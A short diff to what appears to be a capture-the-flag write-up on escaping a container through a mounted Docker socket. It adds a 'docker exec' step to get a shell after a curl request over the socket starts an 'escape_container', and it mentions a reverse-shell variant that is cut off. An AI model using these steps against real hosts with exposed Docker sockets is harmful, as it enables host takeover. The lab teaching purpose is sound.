@@ -61,6 +61,10 @@ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
   ```
   curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
   ```
+  3. Get a shell
+  ```
+  docker exec -it escape_container sh
+  ```
   You can do the same to get a reverse shell
   ```
   # Create the container
